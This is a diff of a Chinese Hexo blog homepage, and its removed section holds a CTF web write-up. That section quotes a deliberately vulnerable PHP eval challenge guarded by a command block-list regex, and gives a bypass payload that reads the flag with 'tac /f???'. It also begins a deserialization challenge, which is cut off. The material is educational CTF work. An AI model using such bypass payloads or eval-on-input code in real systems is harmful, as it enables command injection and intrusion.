@@ -1,475 +1,179 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Blank - blank's_blog</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
+<meta property="og:title" content="Blank">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Blank">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "Blank",
+  "alternateName": [
+    "blank's_blog",
+    "example.com"
+  ],
+  "url": "http://example.com/"
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
 
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="utf-8" />
-    <title>Blank</title>
-    <meta name="author" content="John Doe" />
-    <meta name="description" content="" />
-    <meta name="keywords" content="" />
-    <meta
-        name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
-    />
-    <link rel="icon" href="/images/baizi.jpg" />
-    <link rel="preconnect" href="https://s4.zstatic.net" />
-<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
-<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
-<link rel="preconnect" href="https://fonts.googleapis.cn" />
-<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
-<link
-    rel="stylesheet"
-    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
-/>
-<script> const mixins = {}; </script>
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
 
-<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
 
-
-
-
-<script src="/js/lib/preview.js"></script>
-
-
-
-
-
-<script src="/js/lib/home.js"></script>
-
-<link rel="stylesheet" href="/css/main.css" />
-
-<meta name="generator" content="Hexo 8.1.1"></head>
-<body>
-    <div id="layout">
-        <transition name="fade">
-            <div id="loading" v-show="loading">
-                <div id="loading-circle">
-                    <h2>LOADING</h2>
-                    <p>加载过慢请开启缓存 浏览器默认开启</p>
-                    <img src="/images/heita.gif" />
-                </div>
-            </div>
-        </transition>
-        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
-    <nav id="desktop-menu">
-        <a class="title" href="/">
-            <span>BLANK</span>
-        </a>
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
         
-        <a href="/">
-            <i class="fa-solid fa-house fa-fw"></i>
-            <span>&ensp;Home</span>
-        </a>
-        
-        <a href="/about">
-            <i class="fa-solid fa-id-card fa-fw"></i>
-            <span>&ensp;About</span>
-        </a>
-        
-        <a href="/archives">
-            <i class="fa-solid fa-box-archive fa-fw"></i>
-            <span>&ensp;Archives</span>
-        </a>
-        
-        <a href="/categories">
-            <i class="fa-solid fa-bookmark fa-fw"></i>
-            <span>&ensp;Categories</span>
-        </a>
-        
-        <a href="/tags">
-            <i class="fa-solid fa-tags fa-fw"></i>
-            <span>&ensp;Tags</span>
-        </a>
-        
-    </nav>
-    <nav id="mobile-menu">
-        <div class="title" @click="showMenuItems = !showMenuItems">
-            <i class="fa-solid fa-bars fa-fw"></i>
-            <span>&emsp;BLANK</span>
-        </div>
-        <transition name="slide">
-            <div class="items" v-show="showMenuItems">
-                
-                <a href="/">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-house fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
-                    </div>
-                </a>
-                
-                <a href="/about">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-id-card fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
-                    </div>
-                </a>
-                
-                <a href="/archives">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-box-archive fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
-                    </div>
-                </a>
-                
-                <a href="/categories">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-bookmark fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
-                    </div>
-                </a>
-                
-                <a href="/tags">
-                    <div class="item">
-                        <div style="min-width: 20px; max-width: 50px; width: 10%">
-                            <i class="fa-solid fa-tags fa-fw"></i>
-                        </div>
-                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
-                    </div>
-                </a>
-                
-            </div>
-        </transition>
-    </nav>
-</div>
-<transition name="fade">
-    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
-</transition>
-
-        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div id="home-head">
-    <div
-        id="home-background"
-        ref="homeBackground"
-        data-images="/images/funingna.jpg"
-    ></div>
-    <div id="home-info" @click="homeClick">
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="info">
-            <div class="wrap">
-                <h1>Blank</h1>
-                <h3>blank&#39;s_blog</h3>
-                <h5></h5>
-            </div>
-        </span>
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Blank',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'home'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Blank</span></a></span><div id="menus"></div></nav><div id="site-info"><h1 id="site-title">Blank</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts nc" id="recent-posts"><div class="recent-post-items"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/12/20/strs%20run%20away/" title="无标题">无标题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-12-20T07:45:08.531Z" title="发表于 2025-12-20 15:45:08">2025-12-20</time></span></div><div class="content">字符逃逸 首先简单了解一下序列化的基本结构格式: {变量类型:长度”内容”;} 字符逃逸是一个在PHP序列化和反序列化中存在的一个漏洞， 成因在于匹配函数（例如str_replace( )）匹配的是序列化后的内容，这样就使得即使修改了序列化的内容，也没有修改长度的内容导致内容部分与长度数值不匹配导致了增多和减少的情况。可以通过注入命令的字符串的个数来进行对应的字符增减，接下来看一个简单的代码。 12345678910111213141516&lt;?phpfunction filter($str)&#123;    return str_replace(&#x27;bb&#x27;,&#x27;ccc&#x27;,$str);&#125;class A&#123;    public $str=&#x27;bb&#x27;;    public $pass=&#x27;123&#x27;;&#125;$A=new A();echo serialize($A).&quot;\n&quot;;$r=filter(serialize($A));echo $r.&quot;\n&quot...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/11/18/php-ini/" title="php.ini">php.ini</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-11-18T15:25:44.000Z" title="发表于 2025-11-18 23:25:44">2025-11-18</time></span></div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/11/14/0xGame-week1-web-wp/" title="0xGame week1 web wp">0xGame week1 web wp</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-11-14T04:37:34.000Z" title="发表于 2025-11-14 12:37:34">2025-11-14</time></span></div><div class="content">1.Lemon 打开链接后发现只有一句话的内容，这时候先查看网页（客户端）源代码，有些信息可能是以注释的形式存在于源代码中，而不会在页面端显示，一般打开源代码的方式有f12，右键寻找源代码键，以及Ctrl + U（windows&#x2F;linux系统），mac系统是Command + Option + U，但发现f12和右键被禁用了     但是Ctrl + U依旧有效，得到flag     2.RCE打开页面得到一串PHP代码   接下来审计代码 12error_reporting(0); highlight_file(__FILE__);  关闭所有PHP错误、警告和通知信息的输出。 （高亮文件内容（在这里显示的就是这里的PHP代码内容）[“FILE_”是PHP中的魔术常量，代表着当前文件的完整路径和文件名，如果这个文件所在服务器的路径是&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php的话，那么这个魔术常量的值就是这个。这个魔术常量的作用又由highlight_file()函数体现出来，这个函数可以接收一个文件名作为参数，可以读取这个...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2025/11/13/Hello-World/" title="Hello World">Hello World</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2025-11-13T05:26:15.000Z" title="发表于 2025-11-13 13:26:15">2025-11-13</time></span></div><div class="content">Hello World! </div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">John Doe</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/20/strs%20run%20away/" title="无标题">无标题</a><time datetime="2025-12-20T07:45:08.531Z" title="发表于 2025-12-20 15:45:08">2025-12-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/18/php-ini/" title="php.ini">php.ini</a><time datetime="2025-11-18T15:25:44.000Z" title="发表于 2025-11-18 23:25:44">2025-11-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/14/0xGame-week1-web-wp/" title="0xGame week1 web wp">0xGame week1 web wp</a><time datetime="2025-11-14T04:37:34.000Z" title="发表于 2025-11-14 12:37:34">2025-11-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/13/Hello-World/" title="Hello World">Hello World</a><time datetime="2025-11-13T05:26:15.000Z" title="发表于 2025-11-13 13:26:15">2025-11-13</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/Hexo/" style="font-size: 1.1em; color: #999">-Hexo</a> <a href="/tags/0xGame-Web-week1/" style="font-size: 1.1em; color: #999">-0xGame Web -week1</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
     </div>
-</div>
-<div
-    id="home-posts-wrap"
-    ref="homePostsWrap"
-    true
->
-    <div id="home-posts">
-        
-
-<div class="post">
-    <a href="/2025/11/18/php-ini/">
-        <h2 class="post-title">php.ini</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
             </span>
-            2025/11/18
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2025/11/18/php-ini/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/11/14/0xGame-week1-web-wp/">
-        <h2 class="post-title">0xGame week1 web wp</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
             </span>
-            2025/11/14
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="1-Lemon"><a href="#1-Lemon" class="headerlink" title="1.Lemon"></a>1.Lemon</h1><p> 打开链接后发现只有一句话的内容，这时候先查看网页（客户端）源代码，有些信息可能是以注释的形式存在于源代码中，而不会在页面端显示，一般打开源代码的方式有f12，右键寻找源代码键，以及Ctrl + U（windows&#x2F;linux系统），mac系统是Command + Option + U，但发现f12和右键被禁用了</p>
-<img src="lemon1.png" style="zoom:60%;" />
-
-<img src="lemon2.png" style="zoom:60%;" />
-
-<p>但是Ctrl + U依旧有效，得到flag</p>
-<img src="lemon3.png" style="zoom:60%;" />
-
-
-
-<h1 id="2-RCE"><a href="#2-RCE" class="headerlink" title="2.RCE"></a>2.RCE</h1><p>打开页面得到一串PHP代码</p>
-<img src="RCE1.1.png" style="zoom:60%;" />
-
-<p>接下来审计代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-
-<p><strong>关闭所有PHP错误、警告和通知信息的输出</strong>。</p>
-<p>（高亮文件内容（在这里显示的就是这里的PHP代码内容）[“<em>FILE</em>_”是PHP中的魔术常量，代表着当前文件的完整路径和文件名，如果这个文件所在服务器的路径是&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php的话，那么这个魔术常量的值就是这个。这个魔术常量的作用又由highlight_file()函数体现出来，这个函数可以接收一个文件名作为参数，可以读取这个文件内容，并将其中的源代码以语法高亮的HTML格式输出到浏览器]）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rce1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce1&#x27;</span>];</span><br><span class="line"><span class="variable">$rce2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce2&#x27;</span>];</span><br><span class="line"><span class="variable">$real_code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce3&#x27;</span>]; </span><br></pre></td></tr></table></figure>
-
-<p>分别用GET和POST方法获取rce1 （rce2，real_code）并赋值给rce1，rce2，real_code。GET请求和POST请求是HTTP协议里的内容</p>
-<p>（GET请求是从Web服务器指定的资源中获取一个资源数据，本质上是“只读”作用不会对服务器上的数据做出修改，通常的格式是在URL后面以?变量名&#x3D;value的形式写入，如果要GET多个变量要以&amp;连接</p>
-<p>POST请求则是向Web服务器中指定的资源提交要被处理的数据，通常会导致服务器状态变化，POST请求的参数是放在HTTP请求的消息体中发送的。（一般会借助Hackbar，burp suite等工具发送））</p>
-<p>更多的HTTP内容[点击这里](<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/Overview">HTTP 概述 - HTTP | MDN</a>)查看</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(?:\d|[\$%&amp;#@*]</span></span><br><span class="line"><span class="string">|system|cat|flag|ls|echo|nl|</span></span><br><span class="line"><span class="string">rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i&#x27;</span>; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$text</span></span>): <span class="title">bool</span> </span>&#123;  </span><br><span class="line"><span class="keyword">global</span> <span class="variable">$pattern</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">bool</span>) <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$text</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>首先这里定义了一个正则表达式模式，用于匹配被选中的项，正则表达式从&#x2F;开始，以&#x2F;结束(?:  )中的内容就是会被匹配的项,之间以”|“分隔，在这里的意思是，会匹配:    \d:0-9的所有数字   []中的$%&amp;#@*，不过这里的$前面有个\，对$进行了转义（目的是防止其匹配以$结尾的字符串，这里只是单纯想匹配$这个字符）</p>
-<p>以及system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings这一系列字符串（不包括|）</p>
-<p>这里&#x2F;后面的i表示不区分大小写，所以通过大小字母的形式绕过匹配检测。</p>
-<p>function check(string $text):   这边定义了一个函数，用于正则匹配是否含有被匹配的内容，这里的bool即表示这个函数会返回一个布尔值（true(1) or false(0)），如果text内容里没有匹配的内容则会返回0，成功绕过了检测，</p>
-<p>这里的global $pattern;是告知PHP $pattern是已经在外部定义过了的全局变量。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$rce2</span>))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$rce1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$rce2</span>) &amp;&amp; <span class="variable">$rce1</span> !== <span class="variable">$rce2</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">check</span>(<span class="variable">$real_code</span>))&#123;    </span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$real_code</span>);  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;     </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t hack me ~&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;     <span class="keyword">echo</span> <span class="string">&quot;md5 do not match correctly&quot;</span>; </span><br><span class="line">           &#125; </span><br><span class="line">&#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please provide both rce1 and rce2&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>if (isset($rce1) &amp;&amp; isset($rce2))这里检测rce1和rce2是否被赋值且不为空值，成功则进入下一个语句，失败则echo  “Please provide both rce1 and rce2” </p>
-<p>md5($rce1) &#x3D;&#x3D;&#x3D; md5($rce2) &amp;&amp; $rce1 !&#x3D;&#x3D; $rce2，这里要求rce1和rce2的不完全相等（!&#x3D;&#x3D;是&#x3D;&#x3D;&#x3D;的完全取否，如果&#x3D;&#x3D;&#x3D;不成立，那么!&#x3D;&#x3D;就会成立，所以可以令rce&#x3D;1，rce2&#x3D;“1”），但它们的md5值相同（那么之前的方法就在这里不成立了，数字的md5值与字符串的md5值并不相等），所以这里是个很矛盾的点，但是由于php中的md5（）函数无法处理数组当md5（）函数处理数组时会返回NULL，这就会使NULL&#x3D;&#x3D;NULL使得表达式成立。由于我们在使用GET和POST请求获取和传输数据时，?rce1[]&#x3D;a会告诉PHP不要把a当作普通变量处理，而是创造一个数组，并将a放进去，这样rce1&#x3D;array(“a”)这样就满足了代码要求。<br>对于if(!check($real_code)),!是取反的意思，因为上述说如果匹配到了字符则会返回1值但这里由于有!则会返回0，不满足if的条件要求，则不会执行<br>eval（）函数。那么在这里我们就知道了，我们要满足一系列要求，并且$real_code中需要填写的是需要执行的命令函数，且需要绕过一些内容。<br>给出payload：用hackbar 在网页URL后面加上&#x2F;?rce1[]&#x3D;a<br>在POST消息体中传输rce2[]&#x3D;b&amp;rce3&#x3D;print(‘tac &#x2F;f???’)   &#x2F;或者可以用.进行字符串连接。</p>
-<img src="RCE1.2.png" style="zoom:60%;" />
-
-<h1 id="3-Http的真理，我已解明"><a href="#3-Http的真理，我已解明" class="headerlink" title="3.Http的真理，我已解明"></a>3.Http的真理，我已解明</h1><p>根据要求依次完成即可：1. url&#x2F;?hello&#x3D;web 2.POST :http&#x3D;good 3.cookie:Sean&#x3D;god   4. User-Agent：Safari  5.Referer:<a target="_blank" rel="noopener" href="http://www.mihoyo.com/">www.mihoyo.com</a>  6. Via：clash</p>
-<img src="http.png" style="zoom:60%;" />
-
-<h1 id="4-Rubbish-Unser"><a href="#4-Rubbish-Unser" class="headerlink" title="4.Rubbish_Unser"></a>4.Rubbish_Unser</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZZZ</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yuzuha</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$yuzuha</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span> -&gt; yuzuha = <span class="variable">$yuzuha</span>;  </span><br><span class="line">    &#125;   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;破绽，在这里！&quot;</span> . <span class="variable language_">$this</span> -&gt; yuzuha;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HSR</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$robin</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$robin</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable">$castorice</span> = <span class="variable language_">$this</span> -&gt; robin;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$castorice</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="class"><span class="keyword">class</span> <span class="title">HI3rd</span> </span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">public</span> <span class="variable">$RaidenMei</span>; </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$kiana</span>; </span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$guanxing</span>; </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"> </span>&#123;   </span><br><span class="line">     <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; kiana !== <span class="variable language_">$this</span> -&gt; RaidenMei</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; kiana) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; RaidenMei) </span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span> -&gt; kiana) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span> -&gt; RaidenMei))  </span><br><span class="line">         <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; guanxing -&gt; Elysia; </span><br><span class="line"> &#125; </span><br><span 